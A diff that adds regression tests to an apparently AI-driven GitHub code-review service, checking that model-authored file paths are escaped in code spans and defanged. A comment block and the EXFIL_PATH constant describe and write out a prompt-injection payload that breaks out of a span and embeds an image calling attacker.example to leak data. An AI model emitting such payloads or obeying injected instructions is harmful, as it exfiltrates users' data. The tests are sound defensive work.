@@ -13,6 +13,7 @@ from app.services.review_publisher import (
     EVENT_MODE_NATIVE,
     MAX_POST_ERROR_CHARS,
     ReviewEvent,
+    _code_span,
     build_review_body,
     partition_comments,
     resolve_event,
@@ -615,3 +616,108 @@ def test_unanchorable_comment_text_is_defanged() -> None:
     )
 
     assert "![](" not in body
+
+
+# ── #298: the one model string that reached GitHub un-defanged ────────────────
+#
+# `file_path` was interpolated raw between single backticks in the unanchorable
+# list. Every neighbouring string went through `defang_model_markdown`; this one
+# did not, and it is reached for exactly the comments whose path was *not* found
+# in the diff — the ones the model invented, which is to say the ones a prompt
+# injection in a pull request gets to choose.
+
+# What an injected model would be told to emit: break out of the code span,
+# then fetch a URL carrying whatever it was told to encode. GitHub renders it
+# through camo, which fetches server-side, so the callback fires with no click.
+EXFIL_PATH = "x` ![](https://attacker.example/c?d=stolen) `y"
+
+
+def test_an_injected_path_cannot_break_out_of_its_code_span() -> None:
+    body = build_review_body(
+        "summary",
+        event=resolve_event("comment", is_own_pr=False, mode=EVENT_MODE_COMMENT_ONLY),
+        unanchorable=[_comment(path=EXFIL_PATH, text="finding")],
+    )
+
+    # Two independent guarantees, because either alone would be enough and
+    # neither should be the only one standing.
+    #
+    # The span cannot be closed: it is opened with a run longer than anything
+    # inside it, so the payload's own backtick is inert.
+    assert "``" in body
+    # And the payload is defanged anyway, so even a future change that broke the
+    # span would not produce a fetching image.
+    assert "![](" not in body
+    assert "!\\[](" in body
+
+
+def test_the_overview_table_escapes_a_path_the_same_way() -> None:
+    """The second code-span site, sharing one implementation.
+
+    `files` carries model-authored paths too (`LLMFileNote.path`), and the two
+    sites drifting apart is how the first one came to be missed.
+    """
+    body = build_review_body(
+        "summary",
+        event=resolve_event("comment", is_own_pr=False, mode=EVENT_MODE_COMMENT_ONLY),
+        unanchorable=[],
+        files=[(EXFIL_PATH, "a note")],
+    )
+
+    assert "![](" not in body
+    # A pipe in a path would otherwise split the table cell.
+    assert "|" in body
+
+
+@pytest.mark.parametrize(
+    ("raw", "reason"),
+    [
+        ("app/main.py", "an ordinary path renders as an ordinary span"),
+        ("a`b", "one backtick inside needs a two-backtick delimiter"),
+        ("``weird``", "a longer run inside needs a longer delimiter still"),
+        ("`leading", "content starting with a backtick needs a pad space"),
+        ("trailing`", "and content ending with one"),
+    ],
+)
+def test_a_span_is_never_closable_from_inside(raw, reason) -> None:
+    """The CommonMark rule this relies on, asserted as a property.
+
+    A span opened with N backticks closes on the next run of *exactly* N, so
+    the delimiter has to be longer than the longest run in the content. Stated
+    as "no run inside equals the delimiter" rather than by checking the exact
+    output, so the assertion survives a change in how the padding is spelled.
+    """
+    import re
+
+    rendered = _code_span(raw)
+    delimiter = re.match(r"`+", rendered).group(0)
+    inner = rendered[len(delimiter):-len(delimiter)]
+
+    assert delimiter not in inner, reason
+    assert raw in inner, "the path itself must survive, escaping is not redaction"
+
+
+def test_the_body_names_what_was_not_sent() -> None:
+    """A silent omission reads as "reviewed, nothing to say"."""
+    body = build_review_body(
+        "summary",
+        event=resolve_event("comment", is_own_pr=False, mode=EVENT_MODE_COMMENT_ONLY),
+        unanchorable=[],
+        redacted_files=[".env", "staging.env"],
+    )
+
+    assert "`.env`" in body and "`staging.env`" in body
+    assert "hold credentials" in body
+    # Plural agreement, because two files reading "this file appears" is the
+    # kind of thing that makes a security notice look machine-generated and
+    # therefore ignorable.
+    assert "these files appear" in body
+
+
+def test_an_ordinary_review_says_nothing_about_redaction() -> None:
+    body = build_review_body(
+        "summary",
+        event=resolve_event("comment", is_own_pr=False, mode=EVENT_MODE_COMMENT_ONLY),
+        unanchorable=[],
+    )
+    assert "Not sent to the model" not in body
